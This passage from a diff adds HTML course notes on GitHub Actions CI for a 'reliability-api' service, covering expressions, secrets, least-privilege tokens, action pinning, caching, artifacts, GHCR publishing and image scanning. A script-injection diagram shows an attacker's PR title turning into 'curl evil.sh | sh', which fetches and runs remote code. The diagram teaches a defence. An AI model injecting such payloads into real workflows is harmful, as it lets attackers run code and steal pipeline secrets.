+      - <span class="k">env</span>:
+          <span class="k">SHORT_SHA</span>: ${{ needs.build.outputs.short_sha }}  <span class="c"># 3) read it through needs</span>
+        <span class="k">run</span>: echo "Built reliability-api at $SHORT_SHA" &gt;&gt; "$GITHUB_STEP_SUMMARY"</code></pre>
+    <p><code>$GITHUB_OUTPUT</code>, <code>$GITHUB_ENV</code> and <code>$GITHUB_STEP_SUMMARY</code> are <em>files</em> on the runner. Appending <code>name=value</code> to <code>$GITHUB_OUTPUT</code> sets a step output; appending to <code>$GITHUB_ENV</code> exports an env var to all <em>later</em> steps of the same job (you cannot overwrite <code>GITHUB_*</code>/<code>RUNNER_*</code> defaults); Markdown appended to <code>$GITHUB_STEP_SUMMARY</code> shows on the run's summary page. Use <code>::group::title</code> / <code>::endgroup::</code> to fold noisy log sections and <code>::error file=app/main.py,line=10::message</code> to annotate a file.</p>
+
+    <h3><code>concurrency</code></h3>
+    <p>A concurrency <code>group</code> ensures only one run (or job) in that group is active. With <code>cancel-in-progress: true</code>, pushing a new commit to a PR cancels the now-obsolete run for the previous commit — saving minutes and giving a faster signal. For <code>main</code> you usually do <em>not</em> want to cancel: every main commit should be published. The final file therefore uses <code>cancel-in-progress: ${{ github.event_name == 'pull_request' }}</code>.</p>
+
+    <!-- ============================================================ -->
+    <h2>Contexts &amp; expressions</h2>
+    <p><strong>Definition.</strong> An <em>expression</em> is <code>${{ … }}</code> text that GitHub evaluates. A <em>context</em> is an object you read inside expressions, e.g. <code>github.sha</code>. Inside <code>if:</code> you may omit the <code>${{ }}</code> when the whole value is an expression.</p>
+    <div class="table-wrap"><table>
+      <tr><th>Context</th><th>Holds</th><th>Example in our pipeline</th></tr>
+      <tr><td><code>github</code></td><td>run/event info: <code>sha</code>, <code>ref</code>, <code>ref_name</code>, <code>event_name</code>, <code>repository</code>, <code>repository_owner</code>, <code>actor</code>, <code>workflow</code></td><td><code>github.ref == 'refs/heads/main'</code></td></tr>
+      <tr><td><code>env</code></td><td>env vars set in workflow/job/step <code>env:</code></td><td><code>env.IMAGE</code></td></tr>
+      <tr><td><code>vars</code></td><td>configuration variables (org/repo/environment)</td><td><code>vars.KIND_NODE_IMAGE</code> (optional)</td></tr>
+      <tr><td><code>secrets</code></td><td>secret values incl. <code>GITHUB_TOKEN</code></td><td><code>secrets.GITHUB_TOKEN</code> for GHCR login</td></tr>
+      <tr><td><code>steps</code></td><td>outputs / outcome of earlier steps with an <code>id</code></td><td><code>steps.meta.outputs.tags</code></td></tr>
+      <tr><td><code>needs</code></td><td>outputs and <code>.result</code> of jobs listed in <code>needs</code></td><td><code>needs.build.outputs.image</code></td></tr>
+      <tr><td><code>matrix</code>, <code>strategy</code></td><td>current matrix values / strategy settings</td><td><code>matrix.python-version</code></td></tr>
+      <tr><td><code>runner</code></td><td><code>os</code>, <code>arch</code>, <code>temp</code>, …</td><td><code>runner.temp</code> for scratch files</td></tr>
+      <tr><td><code>job</code>, <code>inputs</code></td><td>current job status; dispatch / reusable-workflow inputs</td><td>—</td></tr>
+    </table></div>
+    <p><strong>Language basics.</strong> Literals: booleans, <code>null</code>, numbers, strings in <em>single</em> quotes (double quotes are an error). Operators: <code>! == != &lt; &lt;= &gt; &gt;= &amp;&amp; ||</code>, indexing <code>[ ]</code>, property access. String comparison ignores case. Functions: <code>contains</code>, <code>startsWith</code>, <code>endsWith</code>, <code>format</code>, <code>join</code>, <code>toJSON</code>, <code>fromJSON</code>, <code>hashFiles</code>, and the status functions <code>success()</code> (default), <code>failure()</code>, <code>always()</code>, <code>cancelled()</code>. GitHub recommends <code>!cancelled()</code> over <code>always()</code> for steps that could hang, because <code>always()</code> still runs when the run is being cancelled.</p>
+
+    <h3>When is an expression evaluated? (and why that matters for security)</h3>
+    <figure class="diagram">
+      <svg viewBox="0 0 860 300" role="img" aria-label="Expressions are substituted by GitHub before the script reaches the runner shell; env vars are expanded by the shell at runtime" xml:space="preserve" style="white-space:pre">
+        <defs><marker id="m95" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" style="color:var(--d-stroke)"/></marker></defs>
+        <text x="20" y="28" class="t-bold">Unsafe</text>
+        <rect x="20" y="40" width="250" height="56" rx="8" class="box"/><text x="32" y="64" class="t-mono">run: echo "${{ github.event</text><text x="32" y="82" class="t-mono">  .pull_request.title }}"</text>
+        <rect x="320" y="40" width="200" height="56" rx="8" class="box3"/><text x="420" y="64" text-anchor="middle" class="t-bold">GitHub substitutes</text><text x="420" y="82" text-anchor="middle" class="t-muted">text pasted into script</text>
+        <rect x="570" y="40" width="270" height="56" rx="8" class="box"/><text x="582" y="64" class="t-mono">echo "x"; curl evil.sh | sh; ""</text><text x="582" y="82" class="t-muted">attacker title became shell code</text>
+        <path d="M270 68 H316" class="line bad" marker-end="url(#m95)"/><path d="M520 68 H566" class="line bad" marker-end="url(#m95)"/>
+        <circle cx="830" cy="30" r="8" class="dot-bad"/>
+        <text x="20" y="150" class="t-bold">Safe</text>
+        <rect x="20" y="162" width="250" height="74" rx="8" class="box"/><text x="32" y="184" class="t-mono">env:</text><text x="32" y="202" class="t-mono">  TITLE: ${{ github.event…title }}</text><text x="32" y="220" class="t-mono">run: echo "$TITLE"</text>
+        <rect x="320" y="162" width="200" height="74" rx="8" class="box3"/><text x="420" y="190" text-anchor="middle" class="t-bold">GitHub sets env var</text><text x="420" y="208" text-anchor="middle" class="t-muted">script text is constant</text>
+        <rect x="570" y="162" width="270" height="74" rx="8" class="box4"/><text x="582" y="190" class="t-mono">echo "$TITLE"</text><text x="582" y="208" class="t-muted">shell expands the variable as</text><text x="582" y="224" class="t-muted">data — never parsed as code</text>
+        <path d="M270 199 H316" class="line ok" marker-end="url(#m95)"/><path d="M520 199 H566" class="line ok" marker-end="url(#m95)"/>
+        <circle cx="830" cy="152" r="8" class="dot-ok"/>
+        <text x="20" y="280" class="t-muted">Rule: never interpolate untrusted context (PR titles, branch names, issue bodies, commit messages) directly into run: — route it through env.</text>
+      </svg>
+      <figcaption>Expressions are evaluated by GitHub <em>before</em> the job's script reaches the runner. Interpolating attacker-controlled text into <code>run:</code> is script injection; GitHub's security guide prefers an intermediate environment variable.</figcaption>
+    </figure>
+    <details class="q"><summary>Self-check: why does <code>if: github.ref == 'refs/heads/main'</code> evaluate to false in a pull_request run even when the PR targets main?</summary><div class="a">For <code>pull_request</code>, <code>GITHUB_REF</code> is <code>refs/pull/&lt;n&gt;/merge</code> — the synthetic merge ref — not the base branch. The base branch is available as <code>github.base_ref</code>.</div></details>
+
+    <!-- ============================================================ -->
+    <h2>Secrets, variables and env</h2>
+    <div class="table-wrap"><table>
+      <tr><th></th><th>Secrets (<code>secrets.X</code>)</th><th>Configuration variables (<code>vars.X</code>)</th><th>Env (<code>env:</code> / <code>$X</code>)</th></tr>
+      <tr><td>For</td><td>credentials, tokens, keys</td><td>non-sensitive settings (region, cluster name)</td><td>values for scripts in this workflow</td></tr>
+      <tr><td>Where defined</td><td>repo, environment, organization settings (or <code>gh secret set</code>)</td><td>repo, environment, organization settings</td><td>in the YAML</td></tr>
+      <tr><td>Masked in logs</td><td>yes (redacted automatically)</td><td><strong>no</strong></td><td>no</td></tr>
+      <tr><td>Fork PRs</td><td>not passed (except <code>GITHUB_TOKEN</code>)</td><td>—</td><td>—</td></tr>
+      <tr><td>Usable in <code>if:</code></td><td>not directly — map to a job <code>env</code> first</td><td>yes</td><td>yes (<code>env.X</code>)</td></tr>
+      <tr><td>Limits</td><td>48 KB per secret</td><td>—</td><td>—</td></tr>
+    </table></div>
+    <ul>
+      <li><strong>Precedence:</strong> environment-level beats repository-level beats organization-level for variables/secrets with the same name.</li>
+      <li><strong>Quote secrets in shell</strong>: <code>run: some-cli --token "$TOKEN"</code> with <code>env: TOKEN: ${{ secrets.X }}</code>.</li>
+      <li><strong>Transformed secrets are not masked</strong>: if you base64-encode a secret, the encoded form is a new string — register it with <code>::add-mask::</code> before it can appear in logs.</li>
+      <li><strong>reliability-api needs no custom secrets at all</strong>: GHCR login uses the automatic <code>GITHUB_TOKEN</code>, and cloud access later uses OIDC (no stored keys). That is the goal state: the fewer long-lived secrets, the less to leak.</li>
+    </ul>
+
+    <!-- ============================================================ -->
+    <h2>GITHUB_TOKEN and <code>permissions:</code> (least privilege)</h2>
+    <p><strong>Definition.</strong> At the start of each job GitHub creates a <code>GITHUB_TOKEN</code> — a GitHub App installation access token scoped to the repository that contains the workflow. Steps read it as <code>secrets.GITHUB_TOKEN</code> or <code>github.token</code>. It expires when the job finishes (at most 24 hours; the job limit on GitHub-hosted runners is 6 hours).</p>
+    <p><strong>Problem it solves.</strong> Workflows need to talk to GitHub (check out code, push packages, comment on PRs) without you creating and storing a personal access token. The risk: if a compromised dependency or action runs in your job, it can use whatever the token allows. So you shrink the token to exactly what each job needs.</p>
+
+    <figure class="diagram">
+      <svg viewBox="0 0 860 280" role="img" aria-label="Per-job GITHUB_TOKEN scopes in the reliability-api workflow">
+        <defs><marker id="m96" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" style="color:var(--d-stroke)"/></marker></defs>
+        <rect x="10" y="20" width="200" height="70" rx="8" class="box3"/><text x="110" y="46" text-anchor="middle" class="t-bold">workflow level</text><text x="110" y="66" text-anchor="middle" class="t-mono">permissions:</text><text x="110" y="82" text-anchor="middle" class="t-mono">  contents: read</text>
+        <text x="10" y="120" class="t-muted">Any scope you list → all</text><text x="10" y="136" class="t-muted">unlisted scopes become none.</text>
+        <path d="M210 55 H250" class="line" marker-end="url(#m96)"/>
+        <rect x="256" y="20" width="140" height="56" rx="8" class="box2"/><text x="326" y="44" text-anchor="middle" class="t-bold">test</text><text x="326" y="62" text-anchor="middle" class="t-mono">contents: read</text>
+        <rect x="406" y="20" width="140" height="56" rx="8" class="box2"/><text x="476" y="44" text-anchor="middle" class="t-bold">build</text><text x="476" y="62" text-anchor="middle" class="t-mono">contents: read</text>
+        <rect x="556" y="20" width="140" height="56" rx="8" class="box2"/><text x="626" y="44" text-anchor="middle" class="t-bold">scan</text><text x="626" y="62" text-anchor="middle" class="t-mono">contents: read</text>
+        <rect x="706" y="20" width="140" height="56" rx="8" class="box2"/><text x="776" y="44" text-anchor="middle" class="t-bold">kind-integration</text><text x="776" y="62" text-anchor="middle" class="t-mono">contents: read</text>
+        <rect x="256" y="110" width="290" height="74" rx="8" class="box4"/><text x="401" y="134" text-anchor="middle" class="t-bold">publish (job-level override)</text><text x="401" y="154" text-anchor="middle" class="t-mono">contents: read  packages: write</text><text x="401" y="172" text-anchor="middle" class="t-muted">only job that can write to GHCR</text>
+        <rect x="556" y="110" width="290" height="74" rx="8" class="box" stroke-dasharray="5 4"/><text x="701" y="134" text-anchor="middle" class="t-bold">deploy-gke (Module 11)</text><text x="701" y="154" text-anchor="middle" class="t-mono">contents: read  id-token: write</text><text x="701" y="172" text-anchor="middle" class="t-muted">OIDC token for cloud login</text>
+        <rect x="10" y="210" width="836" height="54" rx="8" class="zone"/>
+        <text x="24" y="234" class="t-bold">Token lifetime:</text><text x="140" y="234">created at job start → used by steps (checkout, docker login) → expires when the job ends.</text>
+        <text x="24" y="254" class="t-muted">Fork PRs get a read-only token regardless of what the YAML asks for (unless an admin changes that setting).</text>
+      </svg>
+      <figcaption>Default to read-only at the top of the file; grant write scopes only on the one job that needs them.</figcaption>
+    </figure>
+    <p><strong>How it works.</strong> <code>permissions:</code> at workflow level sets the default for every job; <code>jobs.&lt;id&gt;.permissions</code> replaces it for that job. Each scope (<code>contents</code>, <code>packages</code>, <code>id-token</code>, <code>pull-requests</code>, <code>security-events</code>, <code>actions</code>, <code>checks</code>, <code>statuses</code>, <code>deployments</code>, <code>attestations</code>, …) takes <code>read</code>, <code>write</code> or <code>none</code>; <code>permissions: {}</code> disables all. Crucially: <em>once you specify any scope, every scope you did not list becomes <code>none</code></em>. GitHub's security guide recommends setting the repository/org default to read-only for contents and raising permissions per job.</p>
+    <div class="callout example"><span class="label">reliability-api</span>Our token needs: <code>contents: read</code> for <code>actions/checkout</code> everywhere; <code>packages: write</code> only in <code>publish</code> (to push to GHCR). GitHub's own "publish Docker image" example also uses <code>attestations: write</code> + <code>id-token: write</code> because it generates a build provenance attestation — we skip attestations for now, so we don't grant those.</div>
+    <h3>Failure cases</h3>
+    <ul>
+      <li><code>denied: permission_denied: write_package</code> (or similar 403) on <code>docker push</code> → the job lacks <code>packages: write</code>, or the package's "Manage Actions access" settings don't include this repository (GitHub notes you may need to add the repo there when a package already exists).</li>
+      <li>Checkout fails with 403 after you added <code>permissions: { packages: write }</code> → you forgot that unlisted <code>contents</code> became <code>none</code>; list <code>contents: read</code> too.</li>
+      <li>Pushes made by a workflow with <code>GITHUB_TOKEN</code> don't trigger new runs — by design, to prevent recursive loops (<code>workflow_dispatch</code>/<code>repository_dispatch</code> are exceptions).</li>
+    </ul>
+
+    <!-- ============================================================ -->
+    <h2>Supply-chain hardening: pin actions to a full commit SHA</h2>
+    <p><strong>Problem.</strong> <code>uses: some/action@v1</code> refers to a <em>tag</em>, and tags are mutable: whoever controls that repository (or steals its credentials) can move <code>v1</code> to new, malicious code, and your next run executes it with your token and secrets. GitHub's secure-use reference: pinning an action to a <strong>full-length commit SHA</strong> is currently the only way to use an action as an immutable release; an attacker would need a SHA-1 collision to substitute code. Verify the SHA comes from the action's own repository, not a fork.</p>
+    <div class="callout danger"><span class="label">Real incident (March 2026)</span>CVE-2026-33634: attackers with compromised credentials force-pushed 76 of 77 version tags of <code>aquasecurity/trivy-action</code> (and all tags of <code>aquasecurity/setup-trivy</code>) to credential-stealing code, and published a malicious Trivy binary release. Workflows referencing those actions <em>by tag</em> silently ran the malware; the advisory says any pipeline that executed an affected version should be treated as fully compromised and all its secrets rotated. Workflows pinned to an earlier full SHA were not affected by the tag move. A scanner — a security tool — was the attack vector: pin <em>every</em> third-party action.</div>
+<pre data-title="Tag reference vs SHA reference"><code><span class="c"># mutable: whatever v7 points to today</span>
+- uses: actions/checkout@v7
+
+<span class="c"># immutable: exactly this commit; the comment keeps it human-readable</span>
+- uses: actions/checkout@&lt;40-hex-commit-sha&gt;   <span class="c"># v7.x.y</span></code></pre>
+<pre data-title="Finding the commit SHA behind a release tag"><code><span class="c"># lists tags and the commit they point to (annotated tags show a ^{} line = the commit)</span>
+git ls-remote --tags https://github.com/actions/checkout 'v7*'
+
+<span class="c"># or via the GitHub API (needs gh auth login)</span>
+gh api repos/actions/checkout/git/ref/tags/v7.0.0 --jq '.object.sha'</code></pre>
+<pre class="o" data-title="Example output (yours will differ — never copy SHAs from notes)"><code>&lt;sha-1&gt;	refs/tags/v7.0.0
+&lt;sha-2&gt;	refs/tags/v7.0.0^{}      &lt;- for an annotated tag, pin THIS (the commit)</code></pre>
+    <p><strong>Trade-off.</strong> SHA pins don't receive fixes automatically. Keep them fresh with Dependabot version updates for the <code>github-actions</code> ecosystem (it opens PRs that bump the SHA and the version comment), and review those PRs like code. The notes below write <code>@vN</code> for readability; <strong>in your repository, replace every <code>@vN</code> with the SHA it resolves to.</strong></p>
+    <ul>
+      <li>Prefer actions from GitHub (<code>actions/*</code>) and the tool vendor (<code>docker/*</code>) over random Marketplace actions; read the source of anything else.</li>
+      <li>Use <code>persist-credentials: false</code> on <code>actions/checkout</code> when later steps don't need to run authenticated git commands — it stops the token being left on disk for other steps (checkout v6+ stores it under <code>$RUNNER_TEMP</code>, but not keeping it at all is better).</li>
+      <li>Never use <code>pull_request_target</code> to check out and build PR code.</li>
+    </ul>
+
+    <!-- ============================================================ -->
+    <h2>Caching</h2>
+    <p><strong>Definition.</strong> A cache stores files (pip downloads, Docker layers) keyed by a string, so later runs can restore them instead of downloading/rebuilding. <strong>Problem it solves:</strong> fresh VMs start empty, so without a cache every run re-downloads FastAPI and rebuilds every Docker layer.</p>
+    <figure class="diagram">
+      <svg viewBox="0 0 860 300" role="img" aria-label="Cache key lookup: exact hit, restore-keys partial hit, or miss then save">
+        <defs><marker id="m97" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" style="color:var(--d-stroke)"/></marker></defs>
+        <rect x="10" y="20" width="250" height="62" rx="8" class="box"/><text x="22" y="44" class="t-mono">key: Linux-pip-&lt;hash of</text><text x="22" y="62" class="t-mono">     requirements*.txt&gt;</text>
+        <path d="M260 51 H296" class="line" marker-end="url(#m97)"/>
+        <polygon points="370,16 440,51 370,86 300,51" class="box3"/><text x="370" y="48" text-anchor="middle" class="t-bold">exact</text><text x="370" y="64" text-anchor="middle" class="t-bold">match?</text>
+        <path d="M440 51 H486" class="line ok" marker-end="url(#m97)"/><text x="452" y="42" class="t-muted">yes</text>
+        <rect x="490" y="22" width="360" height="58" rx="8" class="box4"/><text x="502" y="46" class="t-bold">restore; cache-hit = true</text><text x="502" y="66" class="t-muted">no save at job end (key already exists)</text>
+        <path d="M370 86 V122" class="line" marker-end="url(#m97)"/><text x="380" y="108" class="t-muted">no</text>
+        <polygon points="370,126 440,161 370,196 300,161" class="box3"/><text x="370" y="157" text-anchor="middle" class="t-bold">prefix</text><text x="370" y="173" text-anchor="middle" class="t-bold">match?</text>
+        <path d="M440 161 H486" class="line accent" marker-end="url(#m97)"/><text x="452" y="152" class="t-muted">yes</text>
+        <rect x="490" y="132" width="360" height="58" rx="8" class="box2"/><text x="502" y="156" class="t-bold">restore newest restore-keys match</text><text x="502" y="176" class="t-muted">cache-hit = false; install updates; save new key</text>
+        <path d="M370 196 V232" class="line" marker-end="url(#m97)"/><text x="380" y="218" class="t-muted">no</text>
+        <rect x="250" y="236" width="600" height="50" rx="8" class="box"/><text x="262" y="258" class="t-bold">miss: install from scratch, then save cache under the key at job end</text><text x="262" y="276" class="t-muted">lookups search the current branch, then the base branch (PRs), then the default branch</text>
+      </svg>
+      <figcaption>Cache lookup with <code>actions/cache</code>: <code>key</code> must match exactly for a hit; <code>restore-keys</code> are prefixes tried in order for a partial restore.</figcaption>
+    </figure>
+    <h3>Three caching tools you will use</h3>
+<pre data-title="1) setup-python built-in pip cache (simplest — what ci.yml uses)"><code>- uses: actions/setup-python@v7
+  <span class="k">with</span>:
+    <span class="k">python-version</span>: '3.12'
+    <span class="k">cache</span>: pip                         <span class="c"># caches pip's download cache</span>
+    <span class="k">cache-dependency-path</span>: |             <span class="c"># files hashed into the key</span>
+      requirements.txt
+      requirements-dev.txt</code></pre>
+<pre data-title="2) generic actions/cache (when no setup-* action covers the tool)"><code>- uses: actions/cache@v6
+  <span class="k">with</span>:
+    <span class="k">path</span>: ~/.cache/pip
+    <span class="k">key</span>: ${{ runner.os }}-pip-${{ hashFiles('requirements*.txt') }}
+    <span class="k">restore-keys</span>: |
+      ${{ runner.os }}-pip-</code></pre>
+<pre data-title="3) Docker layer cache in the GitHub Actions cache backend"><code>- uses: docker/setup-buildx-action@v4          <span class="c"># gha cache needs a Buildx builder</span>
+- uses: docker/build-push-action@v7
+  <span class="k">with</span>:
+    <span class="k">cache-from</span>: type=gha
+    <span class="k">cache-to</span>: type=gha,mode=max            <span class="c"># mode=max also caches intermediate stages</span></code></pre>
+    <h3>Rules, limits and failure cases</h3>
+    <ul>
+      <li><strong>Eviction:</strong> entries not accessed for over 7 days are removed; a repository's caches are capped (10 GB by default) and the least recently accessed are evicted first. Expect occasional cold runs.</li>
+      <li><strong>Scope:</strong> a run can restore caches from its own branch, the PR's base branch and the default branch — not from sibling or child branches. So the <em>first</em> PR run after a dependency change is slow; once <code>main</code> builds, every PR benefits.</li>
+      <li><strong>Read-only cache events:</strong> under <code>pull_request_target</code> and <code>issue_comment</code>, the Docker docs note cache writes can fail; you can add <code>ignore-error=true</code> to <code>cache-to</code>.</li>
+      <li><strong>Correctness:</strong> a cache must never change <em>results</em>, only speed. Key on the exact dependency files (hash) so a changed <code>requirements.txt</code> produces a new key. Never cache build outputs you then ship without rebuilding — that is what artifacts/registries are for.</li>
+      <li><strong>Poisoning:</strong> caches written by untrusted runs could be restored by trusted ones; that is one reason PR caches are branch-scoped.</li>
+    </ul>
+
+    <!-- ============================================================ -->
+    <h2>Matrix builds</h2>
+    <p><strong>Definition.</strong> <code>strategy.matrix</code> declares variables; GitHub creates one job per combination. <strong>Problem:</strong> you want to know your code works on Python 3.12 (what the image ships) and the next version (early warning) without copy-pasting the job.</p>
+<pre><code><span class="k">test</span>:
+  <span class="k">runs-on</span>: ubuntu-latest
+  <span class="k">strategy</span>:
+    <span class="k">fail-fast</span>: true                  <span class="c"># default true: one red leg cancels the other in-progress legs</span>
+    <span class="k">max-parallel</span>: 2                  <span class="c"># optional cap on simultaneous legs</span>
+    <span class="k">matrix</span>:
+      <span class="k">python-version</span>: ['3.12', '3.13']
+      <span class="c"># include: / exclude: add or remove specific combinations</span>
+  <span class="k">steps</span>:
+    - uses: actions/setup-python@v7
+      <span class="k">with</span>: { <span class="k">python-version</span>: '${{ matrix.python-version }}' }</code></pre>
+    <ul>
+      <li>Quote versions as strings: YAML reads <code>3.10</code> as the number 3.1.</li>
+      <li><code>fail-fast: true</code> (the default) gives the quickest red signal; set <code>false</code> when you want the full picture of which legs fail (e.g. a compatibility sweep).</li>
+      <li>A job that <code>needs: test</code> waits for <em>all</em> legs; any red leg skips it.</li>
+      <li>Matrix legs appear as separate checks named like <code>test (3.12)</code>; give the job a <code>name:</code> so required-check names stay stable.</li>
+    </ul>
+
+    <!-- ============================================================ -->
+    <h2>Artifacts</h2>
+    <p><strong>Definition.</strong> An artifact is a file or directory uploaded from a job and stored with the workflow run (default retention 90 days, configurable 1–90 per upload with <code>retention-days</code>). Use <code>actions/upload-artifact</code> and <code>actions/download-artifact</code>.</p>
+    <div class="table-wrap"><table>
+      <tr><th></th><th>Cache</th><th>Artifact</th><th>Registry (GHCR)</th></tr>
+      <tr><td>Purpose</td><td>speed up future runs</td><td>pass outputs between jobs; keep evidence (reports, logs)</td><td>distribute deployable images</td></tr>
+      <tr><td>Lifetime</td><td>evicted after 7 days unused</td><td>run-scoped, retention days</td><td>until you delete it</td></tr>
+      <tr><td>Correctness</td><td>may be missing anytime</td><td>guaranteed for that run</td><td>immutable by digest</td></tr>
+      <tr><td>reliability-api</td><td>pip + Docker layers</td><td>image tarball, JUnit reports, kind logs</td><td><code>ghcr.io/&lt;you&gt;/reliability-api:&lt;sha&gt;</code></td></tr>
+    </table></div>
+    <p>Artifact names must be unique within a run (artifacts are immutable; two jobs can't append to the same name) — hence names like <code>junit-py3.12</code>. File permissions aren't preserved in the zip, so tar executables first. If <code>download-artifact</code> gets no <code>name</code>, it downloads all artifacts of the run.</p>
+
+    <!-- ============================================================ -->
+    <h2>Building and pushing the image to GHCR</h2>
+    <p><strong>GHCR</strong> (GitHub Container Registry, <code>ghcr.io</code>) stores OCI images next to your repository. With <code>GITHUB_TOKEN</code> and <code>packages: write</code> a workflow can push to <code>ghcr.io/&lt;owner&gt;/&lt;name&gt;</code> without any stored secret. A newly created package inherits the repository's visibility model.</p>
+    <h3>The four Docker actions and what each contributes</h3>
+    <div class="table-wrap"><table>
+      <tr><th>Action</th><th>Job</th><th>Key inputs we use</th><th>Outputs we use</th></tr>
+      <tr><td><code>docker/setup-buildx-action@v4</code></td><td>creates a BuildKit builder (needed for the <code>gha</code> cache backend)</td><td>—</td><td>—</td></tr>
+      <tr><td><code>docker/metadata-action@v6</code></td><td>computes tags + OCI labels from git/event info</td><td><code>images</code>, <code>tags</code></td><td><code>tags</code>, <code>labels</code></td></tr>
+      <tr><td><code>docker/build-push-action@v7</code></td><td>runs the BuildKit build</td><td><code>context</code>, <code>push</code>, <code>load</code>, <code>tags</code>, <code>labels</code>, <code>cache-from</code>, <code>cache-to</code></td><td><code>imageid</code>, <code>digest</code></td></tr>
+      <tr><td><code>docker/login-action@v4</code></td><td>authenticates the Docker CLI to a registry</td><td><code>registry</code>, <code>username</code>, <code>password</code></td><td>—</td></tr>
+    </table></div>
+    <h3>Tags: the git SHA as the version</h3>
+    <p><code>metadata-action</code>'s <code>type=sha</code> tag defaults to <code>prefix=sha-</code> and <code>format=short</code> (7 characters). We want the template's convention <code>ghcr.io/&lt;you&gt;/reliability-api:&lt;git-sha&gt;</code>, so we set <code>type=sha,format=long,prefix=</code> → the full 40-character SHA, no prefix. metadata-action also lower-cases the image name (GHCR requires lowercase; GitHub owners can contain capitals).</p>
+    <ul>
+      <li><strong>Why not <code>:latest</code>?</strong> It is mutable: you can't tell what's running, rollbacks are ambiguous, and kind/Kubernetes default to <code>imagePullPolicy: Always</code> for <code>:latest</code>, which breaks <code>kind load</code> workflows (kind docs).</li>
+      <li><strong>Tag vs digest:</strong> the SHA tag maps to a commit; the <em>digest</em> (<code>sha256:…</code>, output <code>digest</code>) identifies exact bytes. Deploy by digest when you need absolute immutability (Module 02).</li>
+    </ul>
+
+    <h3>How the image moves through the pipeline</h3>
+    <figure class="diagram">
+      <svg viewBox="0 0 860 260" role="img" aria-label="Image built once, saved as artifact, loaded by scan and kind jobs, pushed by publish job">
+        <defs><marker id="m98" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" style="color:var(--d-stroke)"/></marker></defs>
+        <rect x="10" y="30" width="190" height="92" rx="8" class="box2"/><text x="105" y="54" text-anchor="middle" class="t-bold">build job</text><text x="105" y="74" text-anchor="middle" class="t-muted">buildx build --load</text><text x="105" y="92" text-anchor="middle" class="t-muted">smoke: docker run</text><text x="105" y="110" text-anchor="middle" class="t-muted">docker save → .tar</text>
+        <rect x="250" y="50" width="160" height="52" rx="26" class="box3"/><text x="330" y="72" text-anchor="middle" class="t-bold">artifact</text><text x="330" y="90" text-anchor="middle" class="t-mono">image.tar</text>
+        <path d="M200 76 H246" class="line" marker-end="url(#m98)"/>
+        <rect x="460" y="10" width="170" height="54" rx="8" class="box2"/><text x="545" y="33" text-anchor="middle" class="t-bold">scan job</text><text x="545" y="52" text-anchor="middle" class="t-muted">docker load → trivy</text>
+        <rect x="460" y="88" width="170" height="54" rx="8" class="box2"/><text x="545" y="111" text-anchor="middle" class="t-bold">kind-integration</text><text x="545" y="130" text-anchor="middle" class="t-muted">kind load → apply</text>
+        <rect x="460" y="166" width="170" height="54" rx="8" class="box4"/><text x="545" y="189" text-anchor="middle" class="t-bold">publish job</text><text x="545" y="208" text-anchor="middle" class="t-muted">docker load → push</text>
+        <path d="M410 70 C435 70 435 37 456 37" class="line" marker-end="url(#m98)"/>
+        <path d="M410 80 C435 80 435 115 456 115" class="line" marker-end="url(#m98)"/>
+        <path d="M410 90 C430 90 430 193 456 193" class="line" marker-end="url(#m98)"/>
+        <rect x="690" y="160" width="160" height="66" rx="8" class="box"/><text x="770" y="184" text-anchor="middle" class="t-bold">ghcr.io</text><text x="770" y="204" text-anchor="middle" class="t-mono">…/reliability-api</text><text x="770" y="220" text-anchor="middle" class="t-mono">:&lt;git-sha&gt;</text>
+        <path d="M630 193 H686" class="line ok" marker-end="url(#m98)"/>
+        <text x="10" y="248" class="t-muted">Built once. The bytes that were scanned and integration-tested are exactly the bytes pushed — no rebuild between test and release.</text>
+      </svg>
+      <figcaption>Hand-off via an artifact keeps untested images out of the registry. Alternative: push to a temporary tag first and promote; simpler pipelines just rebuild with a warm cache — at the cost of "tested bits ≠ shipped bits".</figcaption>
+    </figure>
+
+    <h3>Build cache</h3>
+    <p>With <code>cache-from: type=gha</code> / <code>cache-to: type=gha,mode=max</code>, BuildKit stores layers in the Actions cache. If only <code>app/main.py</code> changed, the <code>pip install</code> layer of the Module 02 Dockerfile (dependencies copied before source) is reused. Docker's docs note the gha backend requires the GitHub Cache service API v2 (Buildx ≥ v0.21.0, BuildKit ≥ v0.20.0), which current setup-buildx provides.</p>
+
+    <!-- ============================================================ -->
+    <h2>Image scanning</h2>
+    <p><strong>Definition.</strong> An image scanner inventories OS packages and language dependencies inside the image and matches them against vulnerability databases (CVEs). <strong>Problem:</strong> your code may be fine while <code>python:3.12-slim</code>'s OpenSSL or a transitive pip dependency has a known critical CVE.</p>
+    <p><strong>One option: Trivy</strong> via <code>aquasecurity/trivy-action</code> (README examples use <code>@v0.36.0</code>; the March-2026 advisory names v0.35.0 as the patched release and recommends full-SHA pinning). Others exist (Grype, Docker Scout, GitHub's dependency review for manifests); the concept is the same.</p>
+    <div class="table-wrap"><table>
+      <tr><th>Input</th><th>Default (per README)</th><th>We set</th><th>Why</th></tr>
+      <tr><td><code>image-ref</code></td><td>—</td><td>the SHA-tagged image</td><td>scan the exact bytes we built</td></tr>
+      <tr><td><code>scan-type</code></td><td><code>image</code></td><td>(default)</td><td></td></tr>
+      <tr><td><code>format</code></td><td><code>table</code></td><td>(default)</td><td>human-readable log</td></tr>
+      <tr><td><code>severity</code></td><td>all levels</td><td><code>CRITICAL,HIGH</code></td><td>fail only on what matters</td></tr>
+      <tr><td><code>ignore-unfixed</code></td><td><code>false</code></td><td><code>true</code></td><td>don't block on CVEs with no fix available yet</td></tr>
+      <tr><td><code>exit-code</code></td><td><code>0</code></td><td><code>'1'</code></td><td>default 0 = never fails the job! Set 1 to gate</td></tr>
+    </table></div>
+    <h3>Triage when the scan is red</h3>
+    <ol>
+      <li>Read the table: package, installed version, fixed version, CVE ID, severity.</li>
+      <li><strong>OS package?</strong> Rebuild on a newer base image tag (or digest) — often the fix is already published.</li>
+      <li><strong>Python package?</strong> Bump it in <code>requirements.txt</code>; rerun tests.</li>
